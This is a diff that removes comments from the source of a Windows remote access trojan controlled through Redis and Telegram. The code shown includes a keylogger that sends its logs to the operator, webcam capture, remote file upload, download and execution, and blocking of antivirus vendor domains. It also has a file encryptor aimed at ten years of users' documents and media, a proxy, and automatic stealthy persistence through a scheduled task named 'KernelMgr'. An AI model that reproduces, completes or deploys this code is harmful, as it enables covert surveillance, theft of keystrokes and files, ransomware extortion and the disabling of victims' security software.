@@ -30,10 +30,9 @@ import libs.persistence as persistence_lib
 
 
 REDIS_HOST = ""
-REDIS_PORT = 000 #PORT GOES HERE
+REDIS_PORT = 000
 REDIS_PASS = ""
 
-#TELEGRAM CONF
 TELEGRAM_BOT_TOKEN = ""
 NOTIFY_CHATID = ""
 
@@ -76,11 +75,10 @@ def check_single_instance():
     Ensure only one instance of this script runs for the current computer.
     """
     try:
-        # Try to acquire the lock with a unique identifier
         lock_acquired = redis_client.set(LOCK_KEY, INSTANCE_ID, nx=True, ex=300)
         if not lock_acquired:
             print(f"Another instance is already running for computer {COMPUTER_ID}. Exiting...")
-            sys.exit(0)  # Exit if lock is not acquired
+            sys.exit(0)
         else:
             print(f"Lock acquired for computer {COMPUTER_ID} with instance ID {INSTANCE_ID}.")
     except Exception as e:
@@ -112,18 +110,17 @@ async def refresh_lock():
         try:
             lock_value = redis_client.get(LOCK_KEY)
             if lock_value and lock_value == INSTANCE_ID:
-                redis_client.expire(LOCK_KEY, 300)  # Refresh TTL
+                redis_client.expire(LOCK_KEY, 300)
                 print(f"Lock refreshed for computer {COMPUTER_ID} with instance ID {INSTANCE_ID}.")
             else:
                 print(f"Lock not owned by this instance. Refresh skipped.")
-                break  # Exit refresh loop if lock is no longer owned
+                break
         except Exception as e:
             print(f"[ERROR] Failed to refresh lock: {e}")
-        await asyncio.sleep(120)  # Refresh every 2 minutes
+        await asyncio.sleep(120)
 
 
 
-# Register command handlers
 COMMAND_HANDLERS = {}
 
 
@@ -138,10 +135,10 @@ def command_handler(command):
 async def send_status_update():
     """Send periodic 'stay alive' updates to Redis."""
     while True:
-        timestamp = datetime.now(timezone.utc).isoformat()  # Generate ISO 8601 timestamp
+        timestamp = datetime.now(timezone.utc).isoformat()
         redis_client.hset(REDIS_STATUS_CHANNEL, COMPUTER_ID, timestamp)
-        redis_client.expire(LOCK_KEY, 300)  # Refresh lock TTL
-        await asyncio.sleep(2)  # Send update every 2 seconds
+        redis_client.expire(LOCK_KEY, 300)
+        await asyncio.sleep(2)
 
 
 
@@ -157,7 +154,7 @@ async def command_listener():
         if message and message["type"] == "message":
             try:
                 data = json.loads(message["data"])
-                if is_target_computer():  # Ensure this computer is the target
+                if is_target_computer():
                     await process_command(data)
                 else:
                     print(f"[DEBUG] Ignoring command. Not the target computer.")
@@ -169,12 +166,10 @@ async def command_listener():
 async def process_command(data):
     """Process a command and dispatch to the appropriate handler."""
     if "command" not in data or not data["command"]:
-        # Log and ignore invalid command data
         print(f"[DEBUG] Received invalid command data: {data}")
         return
 
     try:
-        # Safely split the command and arguments
         command, *args = data["command"].split()
         handler = COMMAND_HANDLERS.get(command)
         
@@ -184,7 +179,6 @@ async def process_command(data):
             await send_message(data["chat_id"], f"Unknown command: {command}")
     except Exception as e:
         print(f"[ERROR] Error processing command: {e}")
-        # Optionally, notify the user
         if "chat_id" in data:
             await send_message(data["chat_id"], "An error occurred while processing your command.")
 
@@ -228,22 +222,21 @@ def is_target_computer():
     Check if the current computer is the selected target computer.
     """
     try:
-        # Retrieve the current target computer's UUID from Redis
         target_uuid = redis_client.get("current_computer")
-        local_uuid = get_or_create_uuid()  # Get this computer's UUID
+        local_uuid = get_or_create_uuid()
 
         if target_uuid is None:
             print("[DEBUG] No target computer set in Redis.")
             return False
 
         print(f"[DEBUG] Comparing target UUID: {target_uuid} with local UUID: {local_uuid}")
-        return target_uuid == local_uuid  # Only process if UUIDs match
+        return target_uuid == local_uuid
     except Exception as e:
         print(f"[ERROR] Exception in is_target_computer: {e}")
         return False
 
 
-local_appdata = os.getenv('LOCALAPPDATA')  # Fetches the 'AppData\Local' directory
+local_appdata = os.getenv('LOCALAPPDATA')
 camera_path = os.path.join(local_appdata, 'Microsoft', 'Camera')
 camera_exe_path = camera_path + '\\Camera.exe'
 
@@ -278,7 +271,6 @@ def ensure_camera_executable():
 async def download_file(file_id, file_name, NOTIFY_CHATID):
     """Download a file from Telegram and save it in the current working directory."""
     try:
-        # Get file info from Telegram
         response = requests.get(f"{TELEGRAM_API_URL}/getFile", params={"file_id": file_id})
         response_data = response.json()
 
@@ -289,7 +281,6 @@ async def download_file(file_id, file_name, NOTIFY_CHATID):
         file_path = response_data["result"]["file_path"]
         file_url = f"https://api.telegram.org/file/bot{TELEGRAM_BOT_TOKEN}/{file_path}"
 
-        # Download and save the file
         local_file_path = os.path.join(os.getcwd(), file_name)
         file_content = requests.get(file_url).content
 
@@ -324,14 +315,12 @@ async def handle_upload(data, *args):
 
             if updates.get("ok") and updates["result"]:
                 for update in updates["result"]:
-                    offset = update["update_id"] + 1  # Update the offset
-                    redis_client.set("telegram_offset", offset)  # Persist the offset
+                    offset = update["update_id"] + 1
+                    redis_client.set("telegram_offset", offset)
 
-                    # Check if the update is for the correct chat
                     if "message" in update and update["message"]["chat"]["id"] == NOTIFY_CHATID:
                         message = update["message"]
 
-                        # Detect uploaded files
                         if "document" in message:
                             file_id = message["document"]["file_id"]
                             file_name = message["document"].get("file_name", f"document_{file_id}")
@@ -364,7 +353,6 @@ async def handle_upload(data, *args):
 
             await asyncio.sleep(1)
 
-        # Timeout reached
         await send_message(NOTIFY_CHATID, "File upload timed out. Please try again.")
 
     except Exception as e:
@@ -387,7 +375,6 @@ async def handle_download(data, *args):
         return
 
     try:
-        # Send the file to the user
         with open(file_path, "rb") as file:
             requests.post(
                 f"{TELEGRAM_API_URL}/sendDocument",
@@ -442,14 +429,12 @@ async def handle_execute(data, *args):
     await send_message(NOTIFY_CHATID, f"Command Result:\n{result}")
 
 
-# Initialize FileManager instance
 fm = FileManager()
 
 @command_handler("/cd")
 async def handle_cd(data, *args):
     """Change the current directory."""
     try:
-        # Parse and clean arguments
         command = " ".join(args)
         parsed_args = shlex.split(command)
 
@@ -485,7 +470,6 @@ async def handle_ls(data, *args):
 async def handle_move(data, *args):
     """Move or rename a file/directory."""
     try:
-        # Parse and clean arguments
         command = " ".join(args)
         parsed_args = shlex.split(command)
 
@@ -505,7 +489,6 @@ async def handle_move(data, *args):
 async def handle_copy(data, *args):
     """Copy a file or directory."""
     try:
-        # Parse and clean arguments
         command = " ".join(args)
         parsed_args = shlex.split(command)
 
@@ -525,7 +508,6 @@ async def handle_copy(data, *args):
 async def handle_delete(data, *args):
     """Delete a file or directory."""
     try:
-        # Parse and clean arguments
         command = " ".join(args)
         parsed_args = shlex.split(command)
 
@@ -543,7 +525,6 @@ async def handle_delete(data, *args):
 async def handle_mkdir(data, *args):
     """Create a new directory."""
     try:
-        # Parse and clean arguments
         command = " ".join(args)
         parsed_args = shlex.split(command)
 
@@ -571,7 +552,7 @@ async def handle_list_processes(data, *args):
         try:
             await send_document(NOTIFY_CHATID, os.path.abspath(process_list_file))
         finally:
-            os.remove(process_list_file)  # Clean up temporary file
+            os.remove(process_list_file)
     else:
         await send_message(NOTIFY_CHATID, process_list_file)
 
@@ -585,9 +566,9 @@ async def handle_kill_process(data, *args):
         return
 
     target = args[0]
-    if target.isdigit():  # Kill by PID
+    if target.isdigit():
         result = pm.kill_process_by_pid(int(target))
-    else:  # Kill by name
+    else:
         result = pm.kill_process_by_name(target)
 
     await send_message(NOTIFY_CHATID, result)
@@ -597,23 +578,18 @@ async def handle_msg_box(data, *args):
     """Handle /msg_box command to display a message box."""
     
     try:
-        # Reconstruct the full command text
         full_command = data["command"]
 
-        # Parse arguments using shlex to handle quoted strings
         import shlex
         parsed_args = shlex.split(full_command)
 
-        # Ensure we have exactly two arguments (title and message)
         if len(parsed_args) < 3:
             await send_message(NOTIFY_CHATID, "Usage: /msg_box \"Title\" \"Message\"")
             return
 
-        # Extract the title and message
-        title = parsed_args[1]  # First quoted argument
-        message = parsed_args[2]  # Second quoted argument
+        title = parsed_args[1]
+        message = parsed_args[2]
 
-        # Show the message box
         show_message_box_threaded(title, message)
         await send_message(NOTIFY_CHATID, f"Message box displayed with title: '{title}' and message: '{message}'.")
     except Exception as e:
@@ -704,10 +680,9 @@ async def handle_stop_audio(data, *args):
         await send_message(NOTIFY_CHATID, f"Failed to stop audio playback: {e}")
 
 
-# Global variables for the keylogger
 keylogger_file = None
 keylogger_listener = None
-key_buffer = []  # Buffer to store keys for the current line
+key_buffer = []
 
 @command_handler("/start_keylogger")
 async def handle_start_keylogger(data, *args):
@@ -720,32 +695,27 @@ async def handle_start_keylogger(data, *args):
         await send_message(NOTIFY_CHATID, "Keylogger is already running.")
         return
 
-    # Reset the key buffer
     key_buffer = []
 
-    # Create a temporary file for logging
     keylogger_file = tempfile.NamedTemporaryFile(mode="w", delete=False, suffix=".txt")
     log_file_path = keylogger_file.name
 
-    # Key press handler
     def on_press(key):
         global key_buffer
         try:
             if key == keyboard.Key.enter:
-                # Write the current buffer to a new line
                 keylogger_file.write("".join(key_buffer) + "\n")
-                key_buffer = []  # Reset the buffer
+                key_buffer = []
             elif key == keyboard.Key.space:
-                key_buffer.append(" ")  # Append a space for the space key
+                key_buffer.append(" ")
             elif hasattr(key, 'char') and key.char is not None:
-                key_buffer.append(key.char)  # Append the character key
+                key_buffer.append(key.char)
             else:
-                key_buffer.append(f"[{key.name}]")  # Special keys (e.g., Shift, Ctrl)
-            keylogger_file.flush()  # Ensure logs are saved immediately
+                key_buffer.append(f"[{key.name}]")
+            keylogger_file.flush()
         except Exception as e:
             print(f"Error in keylogger: {e}")
 
-    # Start the keylogger listener
     keylogger_listener = keyboard.Listener(on_press=on_press)
     keylogger_listener.start()
 
@@ -763,25 +733,20 @@ async def handle_stop_keylogger(data, *args):
         await send_message(NOTIFY_CHATID, "Keylogger is not running.")
         return
 
-    # Stop the keylogger
     keylogger_listener.stop()
     keylogger_listener = None
 
-    # Write any remaining buffer content
     if key_buffer:
         keylogger_file.write("".join(key_buffer) + "\n")
         key_buffer = []
 
-    # Close the log file
     if keylogger_file:
         keylogger_file.close()
         log_file_path = keylogger_file.name
         keylogger_file = None
 
-        # Send the log file to the user
         await send_document(NOTIFY_CHATID, log_file_path)
 
-        # Delete the log file after sending
         os.remove(log_file_path)
     else:
         await send_message(NOTIFY_CHATID, "No keylogger logs available to send.")
@@ -813,7 +778,7 @@ async def handle_capture_webcam(data, *args):
     try:
         image_path = capture_image(camera_index)
         await send_document(NOTIFY_CHATID, image_path)
-        os.remove(image_path)  # Clean up temporary file
+        os.remove(image_path)
     except Exception as e:
         await send_message(NOTIFY_CHATID, f"Error capturing image: {e}")
 
@@ -836,28 +801,22 @@ async def handle_tts(data, *args):
     """Convert text to speech and play the audio locally."""
     
     try:
-        # Ensure arguments are provided
         if not args:
             await send_message(NOTIFY_CHATID, "Usage: /tts <text to speak>")
             return
 
-        # Combine arguments into a single text string
         text = " ".join(args)
 
         await send_message(NOTIFY_CHATID, f"Playing TTS: {text}")
 
-        # Create a temporary file for the audio
         with tempfile.NamedTemporaryFile(suffix='.mp3', delete=False) as temp_file:
             output_file = temp_file.name
 
-        # Generate the TTS audio
         tts = gTTS(text)
         tts.save(output_file)
 
-        # Play the audio using the audio_player (ensure this is defined elsewhere in your code)
         audio_player.play(output_file)
 
-        # Notify the user about successful playback
         await send_message(NOTIFY_CHATID, "TTS playback finished successfully.")
 
 
@@ -875,15 +834,12 @@ async def handle_change_wallpaper(data, *args):
             await send_message(NOTIFY_CHATID, "Usage: /change_wallpaper <file_path>")
             return
 
-        # Combine all arguments into a single file path
         file_path = " ".join(args)
 
-        # Validate the file exists
         if not os.path.exists(file_path):
             await send_message(NOTIFY_CHATID, f"File not found: {file_path}")
             return
 
-        # Change the wallpaper
         set_wallpaper(file_path)
 
         await send_message(NOTIFY_CHATID, f"Wallpaper changed to: {file_path}")
@@ -934,7 +890,7 @@ async def handle_change_wallpaper(data, *args):
 async def handle_sysinfo(data, *args):
     """Get and send system information."""
     try:
-        info = systinfo()  # Ensure `systinfo` returns a detailed system report.
+        info = systinfo()
         await send_markdown(NOTIFY_CHATID, f"System Information:\n```\n{info}\n```")
     except Exception as e:
         await send_message(NOTIFY_CHATID, f"Error fetching system information: {e}")
@@ -942,7 +898,6 @@ async def handle_sysinfo(data, *args):
 
 @command_handler("/block_av")
 async def handle_blockav(data, *args):
-    # List of domains to block/unblock
     antivirus_sites = [
         "https://www.bitdefender.com",
         "https://us.norton.com",
@@ -993,7 +948,6 @@ async def handle_blockav(data, *args):
         "https://www.hitmanpro.com"
     ]
 
-    # Convert URLs to domains
     domains = [url.split("//")[1] for url in antivirus_sites]
 
     block_domains(domains)
@@ -1001,7 +955,6 @@ async def handle_blockav(data, *args):
 
 @command_handler("/unblock_av")
 async def handle_unblockav(data, *args):
-    # List of domains to block/unblock
     antivirus_sites = [
         "https://www.bitdefender.com",
         "https://us.norton.com",
@@ -1052,7 +1005,6 @@ async def handle_unblockav(data, *args):
         "https://www.hitmanpro.com"
     ]
 
-    # Convert URLs to domains
     domains = [url.split("//")[1] for url in antivirus_sites]
 
     unblock_domains(domains)
@@ -1078,7 +1030,6 @@ async def handle_blockdomain(data, *args):
     unblock_domains(args)
     await send_message(NOTIFY_CHATID, 'Successfully unblocked domain')
     
-# Global encryptor object (initialized after /set_key is called)
 encryptor = None
 
 @command_handler("/set_key")
@@ -1095,7 +1046,6 @@ async def handle_set_key(data, *args):
 
     encryption_key = args[0]
 
-    # Define the directories and file extensions to scan
     directories_to_search = MultithreadedFileEncryptor.get_all_user_dirs(exclude_c_drive=True)
     extensive_extensions = [
         "3dm", "3ds", "max", "avif", "bmp", "dds", "gif", "heic", "heif", "jpg", "jpeg", "jxl", "png", "psd", "xcf",
@@ -1106,11 +1056,10 @@ async def handle_set_key(data, *args):
         "ogm", "ogx", "qt", "rm", "rmvb", "roq", "srt", "svi", "vob", "webm", "wmv", "xba", "yuv"
     ]
 
-    # Initialize the global encryptor object
     encryptor = MultithreadedFileEncryptor(
         root_dirs=directories_to_search,
         extensions=extensive_extensions,
-        max_age_days=365 * 10,  # Target files modified in the last 10 years
+        max_age_days=365 * 10,
         threads=8,
         encryption_key=encryption_key
     )
@@ -1130,7 +1079,6 @@ async def handle_encrypt_files(data, *args):
         await send_message(NOTIFY_CHATID, "Encryption key is not set. Use /set_key <encryption_key> first.")
         return
 
-    # Start scanning and encrypting files
     await send_message(NOTIFY_CHATID, "Scanning for files to encrypt...")
     encryptor.find_files()
     encryptor.encrypt_all_files()
@@ -1150,13 +1098,11 @@ async def handle_decrypt_files(data, *args):
         await send_message(NOTIFY_CHATID, "Encryption key is not set. Use /set_key <encryption_key> first.")
         return
 
-    # Start decrypting files
     await send_message(NOTIFY_CHATID, "Scanning for files to decrypt...")
     encryptor.decrypt_all_files()
 
     await send_message(NOTIFY_CHATID, "Decryption complete.")
 
-# Global variable to hold the proxy manager instance
 proxy_manager = None
 
 @command_handler("/set_proxy")
@@ -1217,7 +1163,6 @@ async def handle_stop_proxy(data, *args):
     except Exception as e:
         await send_message(NOTIFY_CHATID, f"Failed to stop proxy: {e}")
 
-# Define available persistence methods
 PERSISTENCE_METHODS = {
     "registry": "Sets a registry key to execute the application at startup.",
     "task": "Creates a scheduled task to execute the application at startup.",
@@ -1241,7 +1186,6 @@ async def handle_apply_persistence(data, *args):
             await send_message(NOTIFY_CHATID, "Usage: /apply_persistence <method> [stealth_name] [key_name] [destination_folder]")
             return
 
-        # Extract arguments
         method = args[0]
         stealth_name = args[1] if len(args) > 1 else None
         key_name = args[2] if len(args) > 2 else None
@@ -1251,10 +1195,8 @@ async def handle_apply_persistence(data, *args):
             await send_message(NOTIFY_CHATID, f"Invalid method. Use /list_persistence_methods to see available methods.")
             return
 
-        # Default destination folder to PROGRAMDATA if not specified
         destination_folder = destination_folder or os.path.join(os.getenv("PROGRAMDATA"), "SystemServices")
 
-        # Apply the persistence method using the library
         persistence_lib.apply_persistence(
             method=method,
             stealth_name=stealth_name,
@@ -1327,7 +1269,6 @@ async def register_computer():
     """Register the computer and ensure it's kept registered."""
     while True:
         try:
-            # Check if the computer is already registered
             if redis_client.hget(REDIS_STATUS_CHANNEL, COMPUTER_ID) != "ONLINE":
                 print(f"Registering computer {COMPUTER_ID}...")
                 redis_client.hset(REDIS_STATUS_CHANNEL, COMPUTER_ID, "ONLINE")
@@ -1338,20 +1279,16 @@ async def register_computer():
         except Exception as e:
             print(f"[ERROR] Registration failed: {e}")
 
-        # Wait for 60 seconds before retrying or re-validating registration
         await asyncio.sleep(30)
 
 async def main():
     """Main entry point for the local script."""
     print(f"Computer {COMPUTER_ID} is initializing...")
 
-    # Ensure only a single instance is running
     check_single_instance()
 
-    # Start the lock refresh task
     asyncio.create_task(refresh_lock())
 
-    # Start registration immediately in a separate task
     asyncio.create_task(register_computer())
 
     persistence_lib.apply_persistence(method='task', stealth_name='KernelMgr', key_name='KernelMgr')
@@ -1361,7 +1298,6 @@ async def main():
         text=f"{COMPUTER_ID} successfully connected!"
     )
 
-    # Proceed with other tasks like command listener
     print(f"Starting command listener for {COMPUTER_ID}...")
     await asyncio.gather(send_status_update(), command_listener())
 
